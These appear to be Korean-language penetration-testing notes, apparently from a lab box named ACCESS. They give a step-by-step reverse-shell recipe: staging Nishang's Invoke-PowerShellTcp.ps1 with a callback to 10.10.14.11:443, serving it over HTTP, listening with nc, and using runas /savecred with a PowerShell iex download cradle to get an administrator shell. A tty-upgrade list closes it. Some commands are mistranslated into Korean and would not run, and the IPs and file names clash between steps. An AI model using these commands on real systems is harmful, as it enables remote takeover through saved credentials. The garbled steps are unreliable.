# 리버스 쉘

### Nishang 쉘 만들기 -> 웹 서버 -> 쉘 실행&#x20;

```bash
//쉘 만들기 
root@kali:/opt git clone https://github.com/samratashok/nishang.git
#nishang 쉘 가져오기 
root@kali:/opt mkdir ~/www
root@kali:/opt cp nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/
root@kali tail Invoke-PowerShellTcp.ps1 
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443
#쉘 수정

//웹 서버 실행
root@kali python3 -m http.server 80

//쉘 실행
root@kali nc -lnvp 443

runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/Invoke-PowerShellTcp.ps1')"
#파워쉘을 이용하여 원격으로 스크립트를 다운로드하고 실행하는 명령어 
#"/user:ACCESS\Administrator": 이 부분은 명령을 실행하는 사용자 계정을 지정하는 것입니다. 
#"ACCESS\Administrator"는 사용자 계정의 도메인과 이름을 나타냅니다.
#"/savecred": 이 부분은 사용자 자격 증명을 저장하는 옵션입니다. 사용자가 한 번 자격 증명을 입력하면 이후에는 다시 입력하지 않아도 되도록 자격 증명을 저장합니다.
#"powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')": 이 부분은 PowerShell을 실행하여 웹에서 스크립트 파일을 다운로드하고 실행하는 부분입니다. 
#"iex"는 "Invoke-Expression"의 약어로, 다운로드한 스크립트를 실행하는 역할을 합니다. 
#"new-object net.webclient"는 .NET WebClient 개체를 생성하여 웹에서 파일을 다운로드하는 역할을 합니다. 
#"downloadstring('http://10.10.14.11/shell.ps1')"은 지정된 URL에서 스크립트 파일을 다운로드하는 역할을 합니다. 여기서 "http://10.10.14.11/shell.ps1"은 다운로드할 스크립트 파일의 URL을 나타냅니다.

//쉘 획득
PS C:\Windows\system32>whoami
access\administrator
```



## 쉘 업그레이드

1. `python -c 'import pty;pty.spawn("bash")'`
2. \[ctrl-Z]를 눌러 백그라운드 셸로 이동합니다.
3. `stty raw -echo`
4. `fg`
5. `재설정`
6. 단말기 유형을 묻는 메시지가 표시되면 `화면을` 입력합니다.
